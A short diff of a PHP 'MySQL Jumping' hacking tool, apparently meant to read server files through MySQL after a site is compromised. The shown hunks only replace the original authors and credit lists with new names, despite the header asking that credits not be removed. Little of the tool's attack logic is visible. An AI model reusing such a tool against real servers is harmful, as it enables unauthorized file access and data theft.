@@ -1,20 +1,15 @@
 <?php
 /**
- * @author      Jasman
+ * @author      pavceusa
  * @package	SQL Jumping
- * @copyright	Copyright (C) 2011 Www.ExploreCrew.Org.
  * @license	GNU General Public License version 2 or later; see LICENSE.txt
  * 
  * Notice:
  * All content education purphose only. 
  * Any consequences in views of the use of scripts, techniques, codes, 
  * tutorials, and everything imaginable are purely the 
- * responsibility of the user, NOT ExploreCrew.Org
+ * responsibility of the user, NOT 
  * 
- * Credit:
- * ArRay, `yuda, N4ck0, K4pt3N, samu1241, bejamz, Gameover, antitos, yuki, pokeng, aphe_aphe, jos_ali_joe, BlueBoyz,
- * JFry_, Viva ExploreCrew.Org, AnaskiCrewz, Ihsana's Labs, JibanCrew
- * We hate Ripper!! Please don't remove or change author name of posted article/code, Just to add credit if you fix it.
  */
 
 error_reporting(0);
@@ -43,7 +38,7 @@ if ($_POST['readfile'] == ""){$readfile = trim($_POST['getfile']);} else {$readf
 </head>
 <body>
 <div id="box">
-<h3>MySQL JuMpiNg TooLz<br />Coded by BlueBoyz</h3>
+<h3>MySQL JuMpiNg TooLz<br />Coded by pace usa</h3>
 
 <form method="post" action="" >
 <table>
@@ -141,7 +136,7 @@ if (mysql_query($createtable) ==1){
 
     <hr />
     <div class="foot">Thank to:
-    | ArRay | `yuda | N4ck0 | K4pt3N | samu1241 | bejamz | Gameover | antitos | yuki | pokeng | aphe_aphe | jos_ali_joe | BlueBoyz | <br />
+    <br>hamballah<br>
     <em> JFry_, Viva ExploreCrew.Org, AnaskiCrewz</em> 
     </div>
 </div>
